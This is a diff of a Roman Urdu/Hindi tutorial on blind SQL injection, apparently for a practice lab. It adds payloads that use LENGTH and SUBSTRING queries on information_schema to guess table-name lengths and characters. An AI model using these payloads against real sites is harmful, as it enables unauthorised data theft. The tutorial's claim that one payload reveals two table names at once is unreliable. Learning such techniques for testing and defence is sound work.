@@ -153,11 +153,11 @@ Agar database ka pehla letter 'd' ya kuch or hua, toh page bolega User ID is MIS
 ---
 
 ### Tables Name Extract Karna using Blind SQLi
-​Database mein kitne tables hain aur pehle table ka naam kya hai, yeh check karne ke liye:
+​Database mein kitne tables hain aur pehle table ka naam kya hai iuski length kya hai, yeh check karne ke liye:
 
 `1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=5#`
 
-**Agar page normal load hoo or koi changing naa aye too matlab 5 lenth nhi phir isko change krna hai baar baar jaisy**
+**Agar page normal load hoo or koi changing naa aye too matlab 5 length nhi phir isko change krna hai baar baar jaisy**
 
  
 `1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6#`
@@ -165,6 +165,15 @@ Agar database ka pehla letter 'd' ya kuch or hua, toh page bolega User ID is MIS
 `1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=8#`
 
 Agar page pr koi change aye too matlab utni hi length hai.
+
+**Table ki length pata krny ky baad kya characters hain table main yeh pata Ken ky liye payload:**
+
+`1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1) = 'g'#`
+
+Yeh payload aik sath 2 tables ka name btahe ga 
+
+(LIMIT 0,1 pehly table ka name bataye ga, LIMIT 1,1 doosra table ka name bataye ga).
+
 
 ---
 
